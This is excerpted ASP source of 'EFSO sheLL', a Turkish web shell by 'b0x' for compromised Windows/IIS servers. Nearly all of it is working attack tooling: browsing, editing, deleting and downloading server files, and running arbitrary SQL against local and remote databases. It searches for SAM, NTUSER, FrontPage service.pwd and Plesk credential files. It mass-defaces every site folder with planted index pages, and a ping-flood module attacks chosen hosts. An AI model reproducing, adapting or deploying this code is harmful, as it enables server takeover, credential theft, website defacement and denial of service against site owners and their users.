...
const karakter4="!@#$%^&*()-_+=~`[]{}|\:;<>,.?/"
mail_array = array("yahoo","hotmail","mynet","gmail","hacker")  'özel mailler yaratmak için, SPAM dan kaçarımak için. Secueriy i aşmak için by b0x
uzanti_array = array("com","net","biz","org","gov","br","info") 
yasak_array = array("b0x","gov.tk")
Dim b0x
...
response.write "<title># EFSO sheLL </title>"
...
sub DosyaOku
    ...
    For Each f1 In fc
        ...
        select case uzanti
        case "mdb"
            Response.Write "<a title="" Db in içini Görmek , SQl sorgu yapmak için Tıkla by ejder ;) "" href='"&FilePath&"?mode=13&file="&FolderPath&"\"&f1.Name&"&Path="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>M  "&downStr&"</font></td></tr></table>"
        case "asp"
            Response.Write "<a title="" İçini Görüntülemek için Tıkla "" href='"&FilePath&"?mode=9&file="&FolderPath&"\"&f1.Name&"&Path="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>AÂ± <a title="" Edit File "" href='"&FilePath&"?mode=10&file="&f1.path&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font></td></tr></table>"
        case "jpg","gif"
            Response.Write "<a title="" Resmi Görmek için Tıkla "" href='"&FilePath&"?mode=12&file="&FolderPath&"\"&f1.Name&"&Path="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=webdings size=4>AÂ¢</font><font face=wingdings size=4>  "&downStr&"</font></td></tr></table>"
        case else
...
sub Suruculer
    for each drive_ in b0x.Drives
        ...
        if drive_.Drivetype=1 then Response.write "&nbsp;&nbsp;<font class=""k1""><</font>&nbsp;Disk Drive [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detayı İçin Tıkla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
        if drive_.Drivetype=2 then Response.write "&nbsp;&nbsp;<font class=""k1"">;</font>&nbsp;Sabit Disk  [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detayı İçin Tıkla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
        if drive_.Drivetype=3 then Response.write "&nbsp;&nbsp;<font class=""k1"">;</font>&nbsp;Çıkarılabilir Disk [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detayı İçin Tıkla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
        if drive_.Drivetype=4 then Response.write "&nbsp;&nbsp;<font class=""k2"">AÂ³</font>&nbsp;Cd-Rom [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detayı İçin Tıkla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
...
Sub SurucuInfo
    ...
    if err <> 0 then
    response.write "<center><br> <font color=#FE7A84> <font face=Wingdings size=5>N</font> Disk Hazır değil  !!!! :( <font face=Wingdings size=5>N</font></font> <br></center>"
    else
...
Sub oldu(str)
response.write "<br><center><font color=#C6FCBE> <font face=Wingdings size=5>N</font> "&str&" ;) Tebrikler işlem Başarıyla Gerçekleştirildi.. by b0x <font face=Wingdings size=5>N</font> </font></center>"
End Sub
...
Sub SQL_menu_by_b0x
    ...
    tablo30(" <b>SQL İnjection Merkezi</b>")
    tablo30("&nbsp;")
    tablo12("<font color=#FE7A84> Kullanabilmeniz için SQL kouıtları bilmeniz gerek !!! <br> <font face=Wingdings size=5>N</font> Aksi Halde ASP DOsyası Kitlenir. Cevap veremez. Server a Zarar verir.  <font face=Wingdings size=5>N</font></font>")
    ...
    if b0xsql = "" then
        tablo12("<a href='"&FilePath&"?mode=13&file="&file&"&Path="&FolderPath&"&Time="&time&"'> .... ::: Tablolara Geri Dön ::: .... </a><br>")
    else
        tablo12("<a href='"&FilePath&"?mode=34&file="&file&"&Path="&Path&"&b0xsql="&b0xsql&"&islem=1&Time="&time&"'> .... ::: Tablolara Geri Dön ::: .... </a><br>")
    end if
    response.write "</form></table></td></tr></table><br></center>"
    response.write "<table align=""center"" class=""kbrtm""><tr><td align='center'> <a href='"&FilePath&"?mode=36&Path="&Path&"&Time="&time&"' onclick=""klasor(this.href);return false;""><b>...:::::: SQL Komut Yardım - Kullanım Klavuzu by b0x ::::::...</b></a> </td></tr></table><br>"
end sub
...
Sub SQL_by_b0x(sqlPath,sqlkomut) 
    ...
    objConn.Open
    if err <> 0 then
    response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> DataBase ile Bağlantınız Sağlanamadı !!! by b0x :( <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
    else
        on error resume next
        objRcs.Open sqlkomut,objConn, adOpenKeyset , , adCmdText
        if err <> 0 then
        response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> SQL İnjection Komutunuzda HATA var. ( Bilmiyorsan KullanMA :) ) by b0x <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
        else
...
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'><form name=""MssqlbyE_j_d?er"" method='post' action='"&FilePath&"?mode=34&Path="&Path&"&Time="&time&"'><input name='sec' checked value='mssql' type='radio'> <b>MsSQL</b>  &nbsp;&nbsp;  - &nbsp;&nbsp;  <input name='sec' value='mysql' type='radio'> <b>MySQL</b></td></tr><tr><td>Server IP/Hostname  : <input name='file' value='"&file&"' style='color=#C6FCBE' size=35 type='text'></td></tr><tr><td> DB Adı : <input name='dbname' style='color=#C6FCBE' type='text' value='"&dbname&"' size=44></td></tr><tr><td> KAdı : <input name='dbkadi' style='color=#C6FCBE' value='"&dbkadi&"' type='text' size=46></td></tr><tr><td> Şifre : <input name='dbsifre' style='color=#C6FCBE' type='text' value='"&dbsifre&"' size=46></td></tr><td align='center'> <input name='islem' type='hidden' value='1'><input name='gooo' value=' ..:: Bağlan ::..'  type='Submit'></td></tr></form></table>"
yazorta("TÜm hakları Saklıdır by b0x =)")
...
If Err.Number = 0 Then
    response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&yer&" </a><font color=#C6FCBE> OK !! <font class=""k1"">?</font></td></tr></table>"
else
    response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&yer&" </a><font color=#FE7A84> Noo :( !! <font class=""k1"">?</font></td></tr></table>"
end if
Err.Number = 0
Response.Flush
end sub
...
fastb0x = f1.path
 ...
 if not islem = "ozel" then
    ...
    If Err.Number = 0 Then
        response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&fastb0x&" </a><font color=#C6FCBE> OK !! <font class=""k1"">?</font></td></tr></table>"
    else
        response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&fastb0x&" </a><font color=#FE7A84> Noo :( !! <font class=""k1"">?</font></td></tr></table>"
    end if
    Err.Number = 0
    Response.Flush
...
Sub tester(yer)
    ...
    if Err.Number <> 0 then
        response.write "&nbsp;<b><font color=#FBE1D7>Reading :</font></b> <font color=#FE7A84 class=""k1"">?</font>&nbsp;"
    else
        response.write "&nbsp;<b><font color=#FAFEDE>Reading :</font></b> <font color=#C6FCBE class=""k1"">?</font>&nbsp;"
    end if
    set f = nothing
    Err.Number = 0
    Response.Flush
    ...
    set MyFile = Nothing
    if Err.Number <> 0 then
        response.write "&nbsp;<b><font color=#FBE1D7>Writing :</font></b> <font color=#FE7A84 class=""k1"">?</font>&nbsp;"
    else
        response.write "&nbsp;<b><font color=#FAFEDE>Writing :</font></b> <font color=#C6FCBE class=""k1"">?</font>&nbsp;"
    end if
    set f = nothing
    Err.Number = 0
    Response.Flush
    ...
    if Err.Number <> 0 then
        response.write "&nbsp;<b><font color=#FBE1D7>Deleting :</font></b> <font color=#FE7A84 class=""k1"">?</font>&nbsp;"
    else
        response.write "&nbsp;<b><font color=#FAFEDE>Deleting :</font></b> <font color=#C6FCBE class=""k1"">?</font>&nbsp;"
    end if
    set f = nothing
    Err.Number = 0
    Response.Flush
        ...
        For Each f12 In fc2
            ...
            if InStr(Ucase(f12.name),Ucase(hacked)) > 0 then
                ...
                if Ucase(hacked)="MDB" then
                    Response.Write downStr&"<font class=""k1"" ><a href='"&FilePath&"?mode=5&Path="&Path&"&del="&f12.path&"&Time="&time&"'> ? </a></font> - <a href='"&dosyapath&"?mode=13&file="&f12.path&"&Path="&Path&"&Time="&time&"'>"&f12.path&" ["&f12.size&"]"&"</a></b><br></td></tr></table>"
                    i=i+1
                else
                    Response.Write downStr&"<font class=""k1""><a href='"&FilePath&"?mode=5&Path="&Path&"&del="&f12.path&"&Time="&time&"'> ? </a><a href='"&FilePath&"?mode=10&file="&f12.path&"&Path="&Path&"&Time="&time&"'> ! </a></font> - <a href='"&dosyapath&"?mode=9&file="&f12.path&"&Path="&Path&"&Time="&time&"'>"&f12.path&" [<font color=yellow>"&f12.size&"</font>]"&"</a></b><br></td></tr></table>"
                    i=i+1
                end if
            end if
            Response.Flush
...
'///  by b0x. özel modüller ekledim =). Ne Mutlu TÜRKÜM DİYENE.
 noattack = 1
 bonus = 0
 If b0xpings = "" Then b0xpings = 4
 If b0xpings = 0 Then b0xpings = 4
 If b0xtimeout = "" Then b0xtimeout = 750
 If InStr(b0xsite,"savsak") > 0 or InStr(b0xsite,"yagmurlu") or InStr(b0xsite,"gov.tk") > 0 then noattack = 0
 If InStr(b0xsite,"cyber") > 0 or InStr(b0xsite,"tahri") > 0 or InStr(b0xsite,"hack") > 0 or InStr(b0xsite,"team") > 0 then bonus = 1
  ...
  End Select
    ...
    response.write "Tasvip Etmediğimiz Bir siteye Saldırı yapıyorsun. Tekrarlama Kötü olur senin için. CIZZZ =) euheu by b0x                                                                                                           "
    response.write "Bu b0x sahibine,  gov.tk  ve com.tk sitelere karşı Koruma gerçekleştirildi. TÜRK TÜRK ü VURMAZ.. Kalleşlik yapma by b0x       "
...
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td>"&i&".  Robot Bağlandı..</td></tr></table>"
...
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> Durdurmak için Pencereyi kapat. Her 2 Saniyede bir 3 program açılıyor...</td></tr></table>"
...
if b0x.FolderExists(yer) then
    yazorta("<font class=""k1""><a title="" Dizini Copy/Move File?? "" href='"&FilePath&"?mode=2&Path="&yer&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&Path="&yer&"&del="&yer&"&Time="&time&"'>?</a> 1</font><font size=2><b><a title="" Dizinin i?ine Gir "" href='"&FilePath&"?Path="&yer&"&Time="&time&"'> "&yer&"</a></b>")
end if
End Sub
...
downStr = "<a title=""Dosyayı Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&servu(i)&"&Time="&time&"'>?</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Copy/Move File?? "" href='"&FilePath&"?mode=7&file="&servu(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&servu(i)&"&islem="&servu(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
yazorta("<a title="" İçini Görüntülemek için Tıkla "" href='"&FilePath&"?mode=9&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>"&servu(i)&"</a></b> <font face=wingdings size=4>AÂ± <a title="" Dosyayı Editlemek için Tıkla by b0x :) "" href='"&FilePath&"?mode=10&file="&servu(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
j=j+1
end if
next
if j = 0 then
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Remote olarak Sonuç bulunamadı. Gelişmiş aramayı seçiniz. <font face=Wingdings size=5>N</font> </font>")
end if
...
yazorta("<font class=""k1""><a title="" Dizini Copy/Move File?? "" href='"&FilePath&"?mode=2&Path="&plesk(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&Path="&plesk(i)&"&del="&plesk(i)&"&Time="&time&"'>?</a> 1</font><font size=2><b><a title="" Dizinin içine Gir "" href='"&FilePath&"?Path="&plesk(i)&"&Time="&time&"'>"&plesk(i)&"</a></b>")
j=j+1
end if
next
if j = 0 then
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> "&plesk(0)&" ve "&plesk(1)&" dizinleri bulunamadı. <font face=Wingdings size=5>N</font> </font>")
end if
if b0x.FileExists(plesk(4)) then
downStr = "<a title=""Dosyayı Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&servu(i)&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyayı Kopyala & Taşı "" href='"&FilePath&"?mode=7&file="&servu(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Değiştir "" href='"&FilePath&"?mode=16&file="&servu(i)&"&islem="&servu(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
yazorta("<a title="" içini Görmek için Tıkla "" href='"&FilePath&"?mode=9&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>"&servu(i)&"</a></b> <font face=wingdings size=4>AÂ± <a title="" Dosyayı Editlemek için Tıkla by b0x :) "" href='"&FilePath&"?mode=10&file="&servu(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
else
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Plesk'in  Autsav.sav Dosyası bulunamadı. <font face=Wingdings size=5>N</font> </font>")
end if 
End Sub
...
Sub b0xSam()
    ...
    set MyFile = Nothing
    if Err.Number <> 0 then
        response.write "<center>&nbsp;<b><font color=#FBE1D7>Writing :</font></b> <font color=#FE7A84 class=""k1"">?</font>&nbsp;"
    else
        response.write "<center>&nbsp;<b><font color=#FAFEDE>Writing :</font></b> <font color=#C6FCBE class=""k1"">?</font>&nbsp;"
    end if
    Err.Number=0
    on error resume next
    b0x.DeleteFile "C:config\test.b0x",true
    if Err.Number <> 0 then
        response.write "&nbsp;<b><font color=#FBE1D7>Deleting :</font></b> <font color=#FE7A84 class=""k1"">?</font>&nbsp;</center>"
    else
        response.write "&nbsp;<b><font color=#FAFEDE>Deleting :</font></b> <font color=#C6FCBE class=""k1"">?</font>&nbsp;</center>"
    end if
    on error resume next
    url = "C:config\"
    ...
    Set fc = f.Files
    For Each f1 In fc
       downStr = "<a title=""Dosyayı Sil"" href='"&FilePath&"?mode=5&Path="&url&"&del="&url&""&f1.name&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&url&""&f1.name&"&Path="&url&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&url&""&f1.name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&url&""&f1.name&"&islem="&f1.name&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
       yazorta("<a title="" İçini Görüntülemek için Tıkla "" href='"&FilePath&"?mode=9&file="&url&""&f1.Name&"&Path="&url&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>AÂ± <a title="" Dosyayı Editlemek için Tıkla by b0x :) "" href='"&FilePath&"?mode=10&file="&url&""&f1.name&"&Time="&time&"&Path="&url&"'>!</a>"&downStr&"</font>")
    Next
end Sub
...
Sub b0xVti_Pvt()
    ...
    vti = array(""&local&"\_vti_pvt\access.cnf",""&local&"\..\_vti_pvt\access.cnf",""&local&"\..\..\_vti_pvt\access.cnf",""&local&"\..\..\..\_vti_pvt\access.cnf",""&local&"\_vti_pvt\postinfo.html",""&local&"\..\_vti_pvt\postinfo.html",""&local&"\..\..\_vti_pvt\postinfo.html",""&local&"\..\..\..\_vti_pvt\postinfo.html",""&local&"\vti_pvt/service.pwd",""&local&"\..\vti_pvt/service.pwd",""&local&"\..\..\vti_pvt/service.pwd",""&local&"\..\..\..\vti_pvt/service.pwd")
        ...
        if b0x.FileExists(vti(i)) then
            downStr = "<a title=""Dosyayı Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&vti(i)&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&vti(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyayı Copy & Taşı "" href='"&FilePath&"?mode=7&file="&vti(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Degiştir "" href='"&FilePath&"?mode=16&file="&vti(i)&"&islem="&vti(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
            yazorta("<a title="" İçini Görüntülemek için Tıkla "" href='"&FilePath&"?mode=9&file="&vti(i)&"&Path="&FolderPath&"&Time="&time&"'>"&vti(i)&"</a></b> <font face=wingdings size=4>AÂ± <a title="" Dosyayı Editlemek için Tıkla by b0x :) "" href='"&FilePath&"?mode=10&file="&vti(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
            j=j+1
        end if
    next
    if j = 0 then
        yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Sonuç bulunamadı. Daha geniş Arama yapın by b0x <font face=Wingdings size=5>N</font> </font>")
    end if
end sub
...
Sub b0xNTUser(oturum)
    ...
    for i=0 to 5
        if b0x.FileExists(ntuser(i)) then
            downStr = "<a title=""Dosyayı Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&ntuser(i)&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyayı Copy & Taşı "" href='"&FilePath&"?mode=7&file="&ntuser(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&ntuser(i)&"&islem="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
            yazorta("<a title="" İçini Görüntülemek için Tıkla "" href='"&FilePath&"?mode=9&file="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"'>"&ntuser(i)&"</a></b> <font face=wingdings size=4>AÂ± <a title="" Dosyayı Editlemek için Tıkla by b0x :) "" href='"&FilePath&"?mode=10&file="&ntuser(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
            j=j+1
        end if
    next
    if j = 0 then
...
Sub b0xRepair()
    ...
    Set fc = f.Files
    For Each f1 In fc
       downStr = "<a title=""Dosyayı Sil"" href='"&FilePath&"?mode=5&Path="&url&"&del="&url&""&f1.name&"&Time="&time&"'>?</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&url&""&f1.name&"&Path="&url&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyayı Kopyala & Taşı "" href='"&FilePath&"?mode=7&file="&url&""&f1.name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Değiştir "" href='"&FilePath&"?mode=16&file="&url&""&f1.name&"&islem="&f1.name&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
       yazorta("<a title="" İçini Görüntülemek için Tıkla "" href='"&FilePath&"?mode=9&file="&url&""&f1.Name&"&Path="&url&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>AÂ± <a title="" Dosyayı Editlemek için Tıkla by b0x :) "" href='"&FilePath&"?mode=10&file="&url&""&f1.name&"&Time="&time&"&Path="&url&"'>!</a>"&downStr&"</font>")
    Next
end Sub

Function kodolustur(aralik)
' belirtitiim aralıkda kod oluştuuyorurum. 01#01#01#01# başlangıç iiçin by b0x
    dim coding
    coding = ""
...
' Seçilen Charset leri burda birleştiriyorum by b0x
    Dim dizi
    dizi=""
...
' Stirng kodunu sağdan çözümleyerek Şifre yaratıyor by b0x
    dim hash
    dim sifre
    hash=""
    sifre=""
...
'Türk Bayrağı Ascii Karakterlerle - Created By b0x
...
SELECT CASE mode
CASE 2 ' Dizin Copy TAŞI Coded by b0x
on error resume next
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dizincopypaste"" action='"&FilePath&"' type=""post"">"
response.write "<table class=""kbrtm"" cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
tablo30(" <b>Dizin Copy / Taşı Merkezi</b>")
tablo30("&nbsp;")
...
CASE 3 ' dizin kop taşımam gerçekleşiyor  by b0x
on error resume next
...
CASE 5 ' Dosya silme olayı gerçeklişiypor  by b0x
on error resume next
b0x.DeleteFile del
if err<>0 then
...
CASE 7 ' Dosya Kopayla Taşıma POST kısmı by b0x
on error resume next
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dosyacopypaste"" action='"&FilePath&"' type=""post"">"
...
CASE 8 ' Dosya kopyala, taşımaa olayı by b0x
on error resume next
if islem="kopyala" then
...
if err <> 0 then
response.Write "<br><br><center>Başarısızlıkla sonuçlandı !!! <br>"
else
response.Write "<br><br><center>Klasor "&isl&" <br>"
end if
...
CASE 9 ' Dosya İçini görüntüle by b0x
on error resume next
...
CASE 10 ' ASP txt php .. gibi dosyaları Editlemek için POSt kısmı by b0x 
on error resume next
set f = b0x.OpenTextFile(file,1)
...
Response.Write "<textarea name=""islem"" style='width:350%;height:350;'>"
Response.Write server.HTMLEncode(f.readAll)
Response.Write "</textarea></td></tr></table></form></center>"
Call Status 
nolist = True

CASE 11 ' Editleme olayıı gerçekleşiyorr by b0x
on error resume next
...
CASE 12 ' Resim Dosyasını Görüntülee  by b0x
on error resume next
Response.Write "<br><center><img ALT=""tryag // b0x"" src='"&file&"'></center><br><br>"
Call Status 
nolist = True

CASE 13 ' SQL için TAbloları Listeleme by b0x
Response.Write "<center><b><font size=3>Tablolar</font></br><br>"
Set objConn = Server.CreateObject("ADODB.Connection")
Set objADOX = Server.CreateObject("ADOX.Catalog")
objConn.Provider = "Microsoft.Jet.Oledb.4.0"
...
CASE 14 ' TAblo içeriği görüntüleme by b0x
Call SQL_menu_by_b0x
Call SQL_by_b0x(file,table)
nolist = True

CASE 15 ' SQL kod yerleştirme olayı by b0x
...
if err <> 0 then
    response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> DataBase ile Bağlantınız SağlanaMAdıı !!! by b0x :( <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
else
    on error resume next
    objRcs.Open inject,objConn, adOpenKeyset , , adCmdText
    if err <> 0 then
        Call olmadi("<br>SQL İnjection Komutunuzda HATA var. Bilmiyorsan Kullanma<br><br>")
    else
        Call oldu("<br> SQL İnjection Başarıyla GErçekleştii.<br><br>")
    end if
end if
objRcs.close
objConn.close
...
CASE 16 ' Dosya ADI değiştirme Formu by b0x
on error resume next
response.write "<table width=""100%"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center"">"
...
tablo30(" <b>Dosya ADı değiştirme MErkezi</b>")
tablo30("Adı :  <font color=#C6FCBE>"&islem&"</font> <br> Yeri :  <font color=#C6FCBE>"&file&"</font>")
...
tablo12("<b>Dosyanın Yeni Adı:  </b> &nbsp;<input  size=""30"" type=""text"" name=""islem"" value="&islem&">")
tablo12("<br><input value="" Gönder "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
Call Status 

CASE 17 ' Dosya Adı değiştirme Olayı gerçekleşiyor by b0x
on error resume next
Set fileObject = b0x.GetFile(file) 
fileObject.Name = islem 
if err <> 0 then
    Call olmadi("<br>DOsya Adı değişeMEdii<br><br>")
else
    Call oldu("<br>Dosya Adı değişti<br><br>")
end if
...
tablo12O("<input name=""hash9"" value=""copy"" type=radio checked> Kopyalayarak  -  <input name=""hash9"" value=""yarat"" type=radio> Oluşturarak")
tablo12O("<input value="" Havayaa Uçurr "" type=""Submit"">")
yazsol("<font color=#C6FCBE><b>Brute : </b>Belirtilen Dizinin ALtındaki; Tüm Dizinlere ve onlarında ALt Dizinleri İndex BAsar. </font>")
yazsol("<font color=#C6FCBE><b>Single : </b>Belirtilen Dizinin ALtındaki; Alt Dizinlere İndex BAsar. </font>")
yazsol("<font color=#C6FCBE><b>Private : </b>Belirtilen Dizinin ALtındaki; Alt Dizinlere İstediğiniz İsimle İndex BAsar. </font> ")
yazsol("<font color=#C6FCBE><b>Eklenti : </b>BRUTE & Single ile kullanılır. Permsion var ise bunu seçmenize ayarlamanıza gerek yok. Eğer site isimlerini listeleytebiliyor, ve içine girremiyor fakat klasör atlayarak girebiliyorsanız. o zaman bunu seçin ve bulunan klasörrden sonrakine gidip oraya index leri atar. Mesela ; '..site\b0x_com', '..\site\haber_com' .. gibi siteelr listeli. bunların içlerine giridğinizde görüntülkeme yetkinzi yok . Ama eğer '..\site\b0x_com\www\' yapınca girebiliyorsnaız. PERMİSİON aşma yöntemidir. böylece Eklenti yerine 'www' yazarak ve seçerekden. tüm sitelere o klaösr içine girme yetkisini sağlayıp, index bıraktırırrız. </font> ")
yazsol("<font color=#C6FCBE><b>Kopyalayarak : </b>b0x dizinine bir TXT yazar. Sonra onu TUm  klasörlere KOpyalayarak işlem yapar. Eğer FSO dizininde yazma yok ise, işlem gerçekleşmez.  TUM MASS lar böyledir. </font> ")
yazsol("<font color=#C6FCBE><b>Yaratarak : </b>Direk index kodunuzu, Klasölerde OLUŞTURARAk MASS yapar. BU b0x &  tryag.cc FARkı ile. 1-2 defa başıma geldi=) o yüzden bu özelleiği ekledim.</font> ")
yazsol("<font color=#FE7A84><b>NOT : </b>Brute & Single da 9 çeşit index basar, Private da İstdiğiniz İsimle 1 tane atar ;) </font>")
...
if err <> 0 then
response.write "<center><br><font color=#FE7A84> <font face=Wingdings size=5>N</font>  Bulunduğun Dizinde Yazma YEtin yok. Bu yüzden İndex Sayfası oluşturulamadı. <font face=Wingdings size=5>N</font> <br><br>  <font face=Wingdings size=5>N</font>  Eğer ki Server içine bir Tane index yükler ve aşağıdaki yere tam link ini yazarsan, O zaman MASS Defaced başlıyacaktır. <font face=Wingdings size=5>N</font> <br><br><br></center>"
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dizincopypaste"" action='"&FilePath&"' type=""post"">"
...
Call tablo30("<b>İndex in Server daki kendi İndex inin YErini GÖster. </b>")
Call tablo30("&nbsp;")
Call tablo12("<input  size=""80"" type=""text"" name=""hacked"" style='color=#C6FCBE' value='"&FolderPath&"&/index.html'>")
Call tablo12("<br><input value="" OK tamamd?r. ?ndex imi se?tim.  "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
else
set hacking = nothing
hacked = a&"\b0x.txt"
...
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>Developed By b0x</b><br><br> </td></tr></table> "
...
if err <> 0 then
response.write "<br><br><br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> İndex Bulunamadı. KOnumunu veridğin İndex yada Dosya BULUNAMADI. Mass Durdurudu !!!  <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br><br><br>"
set cloner2 = nothing
else
set cloner2 = nothing
file="b0x"
...
tablo12O("<br><input value="" Teste Başlaaaa... =) by b0x "" type=""Submit""><br><br>")
tablo12("&nbsp;")
response.write "<tr bgcolor=""#121212""><td class=""kbrtm"" align=""left"" width=""100%""  ><font color=#C6FCBE><b>NOT : </b>Bununla, Alt klasörlerde Permision varmı yok mu ,Onu kontrol eder ve Listeler... </font>  <font color=#C6FCBE face=Wingdings size=5>N</font></td></tr>"
response.write "</form></table></td></tr></table><br>"
Call Status 

CASE 22 ' MASS TEster işleme görüntüleme by b0x
Call Tester(Path)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>Developed By b0x</b><br><br> </td></tr></table> "
...
CASE 23 ' arama bulma- en güzel özeliği time out olmaması bulduğunu yazmasıdır =) by b0x eseridir. 
...
